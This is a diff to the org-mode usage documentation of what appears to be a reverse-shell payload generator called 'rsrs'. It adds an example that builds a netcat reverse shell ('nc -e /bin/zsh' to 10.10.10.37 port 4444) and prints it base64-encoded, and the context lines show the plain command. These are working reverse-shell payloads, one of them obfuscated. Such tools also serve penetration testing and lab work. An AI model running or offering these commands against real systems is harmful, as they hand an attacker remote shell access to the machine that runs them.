@@ -23,6 +23,13 @@ rsrs generate -i 10.10.10.37 -p 4444 -r "nc -e" --shell "/bin/zsh"
 nc -e /bin/zsh 10.10.10.37 4444
 #+END_SRC
 
+Generate a netcat shell, that uses zsh, connects to port 4444 on the IP address
+10.10.10.37 and output the string as base64
+#+BEGIN_SRC
+rsrs generate -i 10.10.10.37 -p 4444 -r "nc -e" --shell "/bin/zsh" -e base64
+bmMgLWUgL2Jpbi96c2ggMTAuMTAuMTAuMzcgNDQ0NA==
+#+END_SRC
+
 
 List all shells that run on Linux.
 #+BEGIN_SRC
